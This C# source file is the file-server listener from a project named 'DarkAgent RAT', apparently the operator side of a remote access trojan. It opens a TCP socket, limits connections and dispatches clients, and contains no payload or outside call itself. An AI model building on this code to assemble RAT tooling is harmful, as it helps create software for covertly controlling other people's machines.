using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;

namespace DarkAgent_RAT.src.Network.FileServer
{
    public class FileClientListener
    {
        private Socket _listener;
        public FileClientListener(int port, int key)
        {
            try
            {
                _listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                _listener.Bind(new IPEndPoint(IPAddress.Any, port));
                _listener.Listen(100);
                FileClientProcessor processor = new FileClientProcessor();
                FileClientProcessor.SetNetworkKey(key);
                _listener.BeginAccept(OnClientAccept, null);
            }
            catch
            {
            	MessageBox.Show("Unable to listen at port " + port.ToString(), "DarkAgent RAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

        }

        public void Close()
        {
            _listener.Close();
        }

        private void OnClientAccept(IAsyncResult ar)
        {
            try
            {
                Socket acceptedSocket = _listener.EndAccept(ar);
                System.Threading.Thread.Sleep(50); //Small delay so the process will be using 0-1% cpu usage at flood attack
                if (File_MaxConnections.AcceptConnection(acceptedSocket.RemoteEndPoint))
                     FileClientProcessor.Instance.ProcessClient(acceptedSocket);
                else
                {
                    acceptedSocket.Disconnect(false);
                    acceptedSocket = null;
                }
                _listener.BeginAccept(OnClientAccept, null);
            }
            catch { /*An existing connection was forcibly closed by the remote host*/ }
        }
    }
}
